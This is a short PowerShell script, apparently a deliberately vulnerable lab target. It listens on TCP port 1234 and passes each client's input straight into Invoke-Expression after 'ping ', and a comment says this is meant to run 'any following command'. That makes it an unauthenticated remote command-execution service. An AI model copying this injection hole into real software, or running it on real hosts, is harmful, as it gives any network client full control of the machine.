# Listen to 1234
$listener = [System.Net.Sockets.TcpListener]::new(1234)

# Start it
try {
    $listener.Start()
} catch {
    Write-Host "Error starting listener: $_"
    exit 1
}

# Set up connection loop 
while ($true) {
    # Accept connection
    try {
       $client = $listener.AcceptTcpClient()
    } catch {
        Write-Host "Error accepting client: $_"
        continue
    }

    # Network connect stream
    $stream = $client.GetStream()

    # Read netstream
    $reader = New-Object System.IO.StreamReader($stream)

    # Write stream
    $writer = New-Object System.IO.StreamWriter($stream)

    # Read IP/command
    $ip_command = $reader.ReadLine()

    # Execute the ping command and any following command
    $result = Invoke-Expression ("ping " + $ip_command + " -n 4")

    # Convert the result to a single string
    $result_string = $result -join "
"

    # Write the result string back to the client
    $writer.WriteLine($result_string)
    $writer.Flush()
  
    # Close the connection
    $client.Close()
}
